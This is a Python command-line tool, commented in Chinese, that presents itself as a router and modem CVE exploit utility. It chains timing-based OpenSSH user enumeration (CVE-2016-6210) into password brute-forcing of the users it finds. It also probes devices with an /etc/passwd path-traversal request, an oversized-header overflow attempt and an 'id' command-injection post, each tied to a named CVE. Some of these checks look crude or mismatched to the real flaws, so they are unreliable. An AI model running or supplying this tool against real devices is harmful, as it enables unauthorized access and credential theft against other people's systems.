import paramiko
import time
import re
import argparse
import logging
import requests
from typing import List, Dict

# 配置日志
logging.basicConfig(
    filename="cve_exploit.log",
    level=logging.INFO,
    format="%(asctime)s - %(message)s"
)

class CVEExploit:
    def __init__(self, target: str, port: int, timeout: int = 10):
        self.target = target
        self.port = port
        self.timeout = timeout
        self.ssh_client = paramiko.SSHClient()
        self.ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    def is_valid_ip(self, ip: str) -> bool:
        """验证IP地址格式"""
        pattern = re.compile(r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$")
        return pattern.match(ip) and all(0 <= int(octet) <= 255 for octet in ip.split("."))

    def cve_2016_6210_enum(self, usernames: List[str], threshold: float = 0.5) -> Dict[str, bool]:
        """CVE-2016-6210: OpenSSH用户枚举（时间差异）"""
        BIG_PASSWORD = "A" * 10_000_000
        results = {}
        print("开始CVE-2016-6210用户枚举...")
        for user in usernames:
            start_time = time.time()
            try:
                self.ssh_client.connect(self.target, self.port, username=user, password=BIG_PASSWORD, timeout=self.timeout)
            except:
                pass
            duration = time.time() - start_time
            exists = duration > threshold
            results[user] = exists
            print(f"用户: {user}, 响应时间: {duration:.3f}秒 -> {'存在' if exists else '不存在'}")
            logging.info(f"CVE-2016-6210 - 用户: {user}, 时间: {duration:.3f}s, 存在: {exists}")
        return results

    def cve_2021_20090_check(self, path: str = "/") -> bool:
        """CVE-2021-20090: Arcadyan路由器认证绕过（路径遍历）"""
        url = f"http://{self.target}:{self.port}{path}"
        vuln_path = f"{url}/../../../../etc/passwd"
        try:
            response = requests.get(vuln_path, timeout=self.timeout)
            if response.status_code == 200 and "root:" in response.text:
                print("CVE-2021-20090漏洞存在！可读取/etc/passwd")
                logging.info("CVE-2021-20090 - 检测到漏洞，读取/etc/passwd成功")
                return True
            else:
                print("CVE-2021-20090未检测到漏洞")
                return False
        except requests.RequestException as e:
            print(f"请求失败: {e}")
            return False

    def cve_2019_19494_exploit(self) -> bool:
        """CVE-2019-19494: Cable Haunt（Broadcom调制解调器缓冲区溢出）"""
        url = f"http://{self.target}:{self.port}/spectrum.html"
        payload = "A" * 1024
        headers = {"User-Agent": payload}
        try:
            response = requests.get(url, headers=headers, timeout=self.timeout)
            if response.status_code == 500 or "error" in response.text.lower():
                print("CVE-2019-19494可能存在！服务器返回异常")
                logging.info("CVE-2019-19494 - 可能易受攻击，服务器异常")
                return True
            else:
                print("CVE-2019-19494未检测到漏洞")
                return False
        except requests.RequestException as e:
            print(f"请求失败: {e}")
            return False

    def cve_2023_1389_exploit(self) -> bool:
        """CVE-2023-1389: TP-Link Archer AX21命令注入"""
        url = f"http://{self.target}:{self.port}/cgi-bin/luci"
        payload = {"cmd": "id"}  # 测试命令注入
        try:
            response = requests.post(url, data=payload, timeout=self.timeout)
            if "uid=" in response.text:
                print("CVE-2023-1389漏洞存在！命令注入成功，返回: " + response.text)
                logging.info("CVE-2023-1389 - 命令注入成功")
                return True
            else:
                print("CVE-2023-1389未检测到漏洞")
                return False
        except requests.RequestException as e:
            print(f"请求失败: {e}")
            return False

    def try_login(self, username: str, passwords: List[str]) -> bool:
        """尝试SSH登录"""
        for pwd in passwords:
            try:
                self.ssh_client.connect(self.target, self.port, username=username, password=pwd, timeout=self.timeout)
                print(f"登录成功！用户名: {username}, 密码: {pwd}")
                logging.info(f"登录成功 - 用户名: {username}, 密码: {pwd}")
                return True
            except:
                print(f"登录失败: {username}:{pwd}")
                logging.info(f"登录失败 - 用户名: {username}, 密码: {pwd}")
        return False

    def run(self, cve: str, usernames: List[str], passwords: List[str] = None):
        """运行指定的CVE利用逻辑"""
        if not self.is_valid_ip(self.target):
            print("无效的IP地址！")
            return

        cve = cve.lower()
        if cve == "cve-2016-6210":
            results = self.cve_2016_6210_enum(usernames)
            if passwords and any(results.values()):
                print("\n开始尝试登录...")
                valid_users = [u for u, exists in results.items() if exists]
                for user in valid_users:
                    self.try_login(user, passwords)
        elif cve == "cve-2021-20090":
            self.cve_2021_20090_check()
        elif cve == "cve-2019-19494":
            self.cve_2019_19494_exploit()
        elif cve == "cve-2023-1389":
            self.cve_2023_1389_exploit()
        else:
            print(f"未支持的CVE: {cve}，请扩展程序！")

def main():
    parser = argparse.ArgumentParser(description="自定义路由器/调制解调器CVE利用工具")
    parser.add_argument("--target", "-t", required=True, help="目标IP地址")
    parser.add_argument("--port", "-p", type=int, default=22, help="目标端口（默认22）")
    parser.add_argument("--cve", "-c", required=True, help="CVE编号（如CVE-2016-6210）")
    parser.add_argument("--users", "-u", default="root,admin,nobody", help="用户名列表（逗号分隔）")
    parser.add_argument("--passwords", "-P", help="密码列表（逗号分隔，可选）")
    parser.add_argument("--timeout", type=int, default=10, help="连接超时（秒）")
    args = parser.parse_args()

    usernames = args.users.split(",")
    passwords = args.passwords.split(",") if args.passwords else None

    exploit = CVEExploit(args.target, args.port, args.timeout)
    exploit.run(args.cve, usernames, passwords)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n程序已终止")
